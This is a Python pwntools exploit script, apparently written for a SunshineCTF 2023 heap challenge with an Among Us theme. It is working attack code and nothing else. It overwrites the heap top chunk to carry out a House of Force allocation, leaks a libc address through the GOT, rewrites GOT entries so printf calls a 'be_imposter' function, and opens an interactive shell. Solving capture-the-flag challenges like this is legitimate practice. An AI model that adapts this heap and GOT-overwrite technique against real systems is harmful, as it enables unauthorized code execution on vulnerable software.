#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):

    gs = '''
        b *0x4014f4
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("chal.2023.sunshinectf.games", 23001)
    else:
        return process(binary)

def tasks(p):
    ru(p, b"[3] Call an emergency meeting")
    sl(p, b"1")

def report(p, vote_num):
    ru(p, b"[3] Call an emergency meeting")
    sl(p, b"2")
    ru(p, b"seed: ")

    val = rl(p)

    log.info(f"Leaked rand {val}")
    vote(p, vote_num)

def emergency(p, size, response, vote_num):
    ru(p, b"[3] Call an emergency meeting")
    sl(p, b"3")
    ru(p, b"my tasks >:(\n")
    sl(p, b"%i" % size)
    sl(p, response)


    ru(p, b"responded: ")
    value = rl(p)

    vote(p, vote_num)

def vote(p,vote_num):
    ru(p, b"Red (You)")
    #p.recvuntil(b"IMPOSTER:\n")
    sl(p, b"%i" %vote_num)

def delta(x, y):
    return (0xffffffffffffffff - x) + y

def exploit(p,e,l):
    p.recvuntil(b"game: ")
    heap_leak = int(p.recvline(),16)
    log.info(f"Heap Leak {hex(heap_leak)}")
    
    #puts_leak = report(p, 1)

    # Overwrite top chunk size 
    size = 40
    emergency(p,size,b"\xff"*48, 1) 
    top_chunk = heap_leak + 0x1060 
    distance = delta(top_chunk, 0x405188)

    log.info(f"Distance from top chunk to value {hex(distance)}")

    log.info(f"Mallocing to distance")
    emergency(p, distance-0x20, b"/bin/sh\x00" ,1)

    log.info(f"Setting free to imposter")

    emergency(p, 0x16, p64(e.got["puts"]), 1)
    tasks(p)
    
    sl(p, b"2")
    
    ru(p, b"seed: ")

    puts_leak = int(p.recvline().split(b"0a")[0])
    log.info(f"Leak Libc Puts  {hex(puts_leak)}")
    libc_base = puts_leak - l.sym["rand"]
    log.info(f"Leak libc {hex(libc_base)}")
    log.info(f"Top Chunk {hex(top_chunk)}")

    sl(p, b"1")

    size = 40
    emergency(p,size,b"\xff"*48, 1) 
    distance = delta(0x4051a0, e.got["printf"])
    emergency(p, distance-0x10, b"A", 1)
    value = p64(l.sym["fgets"] + libc_base) +  p64(0x401090) + p64(e.sym["be_imposter"]) + p64(l.sym["__isoc99_scanf"] + libc_base)

    emergency(p, 0x30, value, 1)

    sl(p, b"3")
    sl(p, b"%i" % (top_chunk + 0x10))
 
    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("libc.so.6")

    exploit(p,e,l)
